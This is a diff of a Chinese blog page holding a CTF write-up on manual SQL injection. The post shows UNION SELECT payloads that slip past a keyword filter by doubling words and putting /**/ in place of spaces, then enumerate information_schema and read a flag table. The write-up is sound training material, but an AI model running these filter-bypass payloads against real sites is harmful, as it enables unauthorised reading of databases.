@@ -94,18 +94,18 @@
 
 
 
-<meta name="description" content="简单的sql注入1：开始我的纯手工注入 1发现可以输出id和name，由此可以判断数据库查询输出的只有一行 1‘发现出错，可以注入 1’ union select database()#发现除了database()全部被过滤，再测试一下发现他会自动过滤&amp;gt;1个空格的前面的单词。如1 union select会变成1 select这样我们可以构造两种，一种是双字，一种是利用/**/ 1’//un">
+<meta name="description" content="简单的sql注入1：开始我的纯手工注入  1  发现可以输出id和name，由此可以判断数据库查询输出的只有一行  1‘  发现出错，可以注入  1’ union select database()#  发现除了database()全部被过滤，再测试一下发现他会自动过滤&amp;gt;1个空格的前面的单词。如1 union select会变成1 select这样我们可以构造两种，一种是双字，一种是利用/*">
 <meta name="keywords" content="ctf.web">
 <meta property="og:type" content="article">
 <meta property="og:title" content="平台题目wp">
 <meta property="og:url" content="http://yoursite.com/2017/11/16/平台题目wp/index.html">
 <meta property="og:site_name" content="hhd">
-<meta property="og:description" content="简单的sql注入1：开始我的纯手工注入 1发现可以输出id和name，由此可以判断数据库查询输出的只有一行 1‘发现出错，可以注入 1’ union select database()#发现除了database()全部被过滤，再测试一下发现他会自动过滤&amp;gt;1个空格的前面的单词。如1 union select会变成1 select这样我们可以构造两种，一种是双字，一种是利用/**/ 1’//un">
+<meta property="og:description" content="简单的sql注入1：开始我的纯手工注入  1  发现可以输出id和name，由此可以判断数据库查询输出的只有一行  1‘  发现出错，可以注入  1’ union select database()#  发现除了database()全部被过滤，再测试一下发现他会自动过滤&amp;gt;1个空格的前面的单词。如1 union select会变成1 select这样我们可以构造两种，一种是双字，一种是利用/*">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-18T11:38:08.283Z">
+<meta property="og:updated_time" content="2017-11-18T11:41:04.331Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="平台题目wp">
-<meta name="twitter:description" content="简单的sql注入1：开始我的纯手工注入 1发现可以输出id和name，由此可以判断数据库查询输出的只有一行 1‘发现出错，可以注入 1’ union select database()#发现除了database()全部被过滤，再测试一下发现他会自动过滤&amp;gt;1个空格的前面的单词。如1 union select会变成1 select这样我们可以构造两种，一种是双字，一种是利用/**/ 1’//un">
+<meta name="twitter:description" content="简单的sql注入1：开始我的纯手工注入  1  发现可以输出id和name，由此可以判断数据库查询输出的只有一行  1‘  发现出错，可以注入  1’ union select database()#  发现除了database()全部被过滤，再测试一下发现他会自动过滤&amp;gt;1个空格的前面的单词。如1 union select会变成1 select这样我们可以构造两种，一种是双字，一种是利用/*">
 
 
 
@@ -339,16 +339,43 @@
       
 
       
-        <p>简单的sql注入1：<br>开始我的纯手工注入</p>
-<p>1<br>发现可以输出id和name，由此可以判断数据库查询输出的只有一行</p>
-<p>1‘<br>发现出错，可以注入</p>
-<p>1’ union select database()#<br>发现除了database()全部被过滤，再测试一下发现他会自动过滤&gt;1个空格的前面的单词。如1 union select会变成1 select<br>这样我们可以构造两种，一种是双字，一种是利用/**/</p>
-<p>1’/<strong>/union/</strong>/select/**/database()’或者1’ unionunion  selectselect  database()’<br>其实还有一个坑，就是他过滤了#，可以试一试</p>
-<p>1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/**/table_shcema=’web1<br>出错，发现前面web1前面的所有内容都没有了，说明过滤了table_name或者table_schema，后来证明是table_schema，想到双字</p>
-<p>1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/**/table_schemtable_schemaa=’web1<br>然后得到表，下面要得字段名</p>
-<p>1’/<strong>/union/</strong>/select/<strong>/column_name/</strong>/from/<strong>/information_schema.columns/</strong>/where/**/table_name=’flag<br>这一次我们很快知道，是由于前面的column_name所以</p>
-<p>1’/<strong>/union/</strong>/select/<strong>/column_namcolumn_namee/</strong>/from/<strong>/information_scheminformation_schema.columnsa.columns/</strong>/where/**/table_name=’flag<br>得到这个不是那么容易…因为我漏掉了from，而且information_schema.columns的拼接让我很纠结。。。</p>
-<p>1’/<strong>/union/</strong>/select/<strong>/flag/</strong>/from/<strong>/flag/</strong>/where/**/‘1’=’1<br>我只能说我这里还有一个坑就是where ‘1’=’1 ,我用了’，然后不行，为什么一开始可以呢，我觉得是一开始是select一段字符串，可以用’’拼接，但是from flag后面不能拼接空字符串。可能这是标准写法。</p>
+        <h2 id="简单的sql注入1："><a href="#简单的sql注入1：" class="headerlink" title="简单的sql注入1："></a>简单的sql注入1：</h2><p>开始我的纯手工注入</p>
+<blockquote>
+<p>1</p>
+</blockquote>
+<p>发现可以输出id和name，由此可以判断数据库查询输出的只有一行</p>
+<blockquote>
+<p>1‘</p>
+</blockquote>
+<p>发现出错，可以注入</p>
+<blockquote>
+<p>1’ union select database()#</p>
+</blockquote>
+<p>发现除了database()全部被过滤，再测试一下发现他会自动过滤&gt;1个空格的前面的单词。如1 union select会变成1 select<br>这样我们可以构造两种，一种是双字，一种是利用/**/</p>
+<blockquote>
+<p>1’/<strong>/union/</strong>/select/**/database()’或者1’ unionunion  selectselect<br>database()’</p>
+</blockquote>
+<p>其实还有一个坑，就是他过滤了#，可以试一试</p>
+<blockquote>
+<p>1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/**/table_shcema=’web1</p>
+</blockquote>
+<p>出错，发现前面web1前面的所有内容都没有了，说明过滤了table_name或者table_schema，后来证明是table_schema，想到双字</p>
+<blockquote>
+<p>1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/**/table_schemtable_schemaa=’web1</p>
+</blockquote>
+<p>然后得到表，下面要得字段名</p>
+<blockquote>
+<p>1’/<strong>/union/</strong>/select/<strong>/column_name/</strong>/from/<strong>/information_schema.columns/</strong>/where/**/table_name=’flag</p>
+</blockquote>
+<p>这一次我们很快知道，是由于前面的column_name所以</p>
+<blockquote>
+<p>1’/<strong>/union/</strong>/select/<strong>/column_namcolumn_namee/</strong>/from/<strong>/information_scheminformation_schema.columnsa.columns/</strong>/where/**/table_name=’flag</p>
+</blockquote>
+<p>得到这个不是那么容易…因为我漏掉了from，而且information_schema.columns的拼接让我很纠结。。。</p>
+<blockquote>
+<p>1’/<strong>/union/</strong>/select/<strong>/flag/</strong>/from/<strong>/flag/</strong>/where/**/‘1’=’1</p>
+</blockquote>
+<p>我只能说我这里还有一个坑就是where ‘1’=’1 ,我用了’，然后不行，为什么一开始可以呢，我觉得是一开始是select一段字符串，可以用’’拼接，但是from flag后面不能拼接空字符串。可能这是标准写法。我不懂啊！！！</p>
 <p>大概就这样，看了能解答的私信我。<br>qq:1466742963</p>
 
       
@@ -444,8 +471,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -509,6 +545,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的sql注入1："><span class="nav-number">1.</span> <span class="nav-text">简单的sql注入1：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
